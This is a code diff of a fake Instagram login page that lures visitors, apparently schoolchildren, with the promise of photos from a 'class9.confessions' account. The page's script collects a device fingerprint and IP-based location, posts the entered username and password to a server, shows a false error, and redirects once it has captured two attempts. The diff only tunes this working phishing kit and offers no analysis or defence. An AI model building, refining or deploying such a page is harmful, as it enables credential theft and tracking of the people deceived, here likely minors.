@@ -5,47 +5,47 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background: #fafafa; 
-            margin: 0; 
-            padding: 0; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-        }
-        .container { 
-            background: white; 
-            border: 1px solid #dbdbdb; 
-            border-radius: 8px; 
-            width: 350px; 
-            padding: 30px 20px; 
-            text-align: center; 
-            position: relative; 
-        }
-        .top-right-i { 
-            position: absolute; 
-            top: 15px; 
-            right: 15px; 
-            font-size: 28px; 
-            font-weight: 600; 
-            color: #0095f6; 
-        }
-        .logo-container { 
-            margin-bottom: 12px; 
-        }
-        .insta-logo { 
-            max-width: 100px; 
-            height: auto; 
-        }
-        .insta-text { 
+        body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            font-size: 26px; 
-            font-weight: 700; 
+            background: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            width: 350px;
+            padding: 30px 20px;
+            text-align: center;
+            position: relative;
+        }
+        .top-right-i {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 28px;
+            font-weight: 600;
+            color: #0095f6;
+        }
+        .logo-container {
+            margin-bottom: 12px;
+        }
+        .insta-logo {
+            max-width: 100px;
+            height: auto;
+        }
+        .insta-text {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-size: 26px;
+            font-weight: 700;
             letter-spacing: -1px;
-            color: #262626; 
-            margin-bottom: 20px; 
+            color: #262626;
+            margin-bottom: 20px;
         }
         .signin-box {
             background: rgba(0, 149, 246, 0.08);
@@ -55,46 +55,46 @@
             color: #262626;
             font-size: 15px;
         }
-        input { 
-            width: 100%; 
-            padding: 12px; 
-            margin: 8px 0; 
-            border: 1px solid #dbdbdb; 
-            border-radius: 6px; 
-            background: #fafafa; 
-            box-sizing: border-box; 
-            font-size: 14px; 
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            background: #fafafa;
+            box-sizing: border-box;
+            font-size: 14px;
         }
-        button { 
-            width: 100%; 
-            padding: 12px; 
-            background: #0095f6; 
-            color: white; 
-            border: none; 
-            border-radius: 6px; 
-            font-weight: 600; 
-            margin-top: 10px; 
-            cursor: pointer; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            gap: 8px; 
-            font-size: 15px; 
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            margin-top: 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 15px;
         }
         button:disabled { background: #b2dffc; cursor: not-allowed; }
-        .spinner { 
-            width: 18px; 
-            height: 18px; 
-            border: 3px solid rgba(255,255,255,0.3); 
-            border-top: 3px solid white; 
-            border-radius: 50%; 
-            animation: spin 1s linear infinite; 
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
         }
-        .error { 
-            color: #ed4956; 
-            font-size: 14px; 
-            margin: 12px 0; 
-            display: none; 
+        .error {
+            color: #ed4956;
+            font-size: 14px;
+            margin: 12px 0;
+            display: none;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
@@ -102,33 +102,25 @@
 <body>
     <div class="container">
         <div class="top-right-i">i</div>
-        
+       
         <div class="logo-container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" 
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png"
                  alt="Instagram" class="insta-logo">
         </div>
-
         <div class="insta-text">Instagram</div>
-
         <div class="signin-box">
             Sign in to your account to see photos of<br>
             <strong>smrj.class9.confessions</strong>
         </div>
-
         <input type="text" id="username" placeholder="Phone number, username, or email">
         <input type="password" id="password" placeholder="Password">
-
         <div id="errorMsg" class="error">Incorrect username or password.</div>
-
         <button id="loginBtn">Log in</button>
-
         <div style="margin:25px 0; color:#8e8e8e; font-size:14px;">OR</div>
         <a href="#" style="color:#385185; font-weight:600; text-decoration:none;">Log in with Facebook</a>
-
         <p style="margin-top:25px; font-size:12px;">
             <a href="#" style="color:#00376b; text-decoration:none;">Forgot password?</a>
         </p>
-
         <p style="margin-top:30px; font-size:14px;">
             Don't have an account? <a href="#" style="color:#0095f6; text-decoration:none;">Sign up</a>
         </p>
@@ -139,7 +131,7 @@
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const errorMsg = document.getElementById('errorMsg');
-
+        
         let attemptCount = 0;
 
         async function getFingerprint() {
@@ -150,22 +142,24 @@
             fp.language = navigator.language;
             fp.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
             fp.deviceMemory = navigator.deviceMemory || 'unknown';
-
+            
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
                 fp.battery = `${Math.round(battery.level * 100)}%`;
                 fp.charging = battery.charging ? 'Yes' : 'No';
             }
-
+            
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
                 if (gl) {
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    fp.gpuVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown';
-                    fp.gpuRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
+                    if (debugInfo) {
+                        fp.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        fp.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
                 }
             } catch (e) {}
-
+            
             try {
                 const res = await fetch('https://api.ipapi.is');
                 const data = await res.json();
@@ -181,18 +175,17 @@
                 fp.city = 'unknown';
                 fp.vpn = 'unknown';
             }
-
             return fp;
         }
 
         loginBtn.addEventListener('click', async () => {
             const username = usernameInput.value.trim();
             const password = passwordInput.value.trim();
-
+            
             if (!username || !password) return;
 
             attemptCount++;
-
+            
             loginBtn.innerHTML = '<div class="spinner"></div> Logging in...';
             loginBtn.disabled = true;
             errorMsg.style.display = 'none';
@@ -214,22 +207,24 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-            } catch (e) {}
+            } catch (e) {
+                console.error("Failed to send to server:", e);
+            }
 
             // Clear inputs after every attempt
             usernameInput.value = '';
             passwordInput.value = '';
 
-            if (attemptCount < 3) {
+            if (attemptCount < 2) {           // ← Changed from 3 to 2
                 setTimeout(() => {
                     errorMsg.style.display = 'block';
                     loginBtn.innerHTML = 'Log in';
                     loginBtn.disabled = false;
-                }, 800);   // Faster
+                }, 800);
             } else {
                 setTimeout(() => {
                     window.location.href = "1.html";
-                }, 1000);   // Faster redirect
+                }, 1000);
             }
         });
     </script>
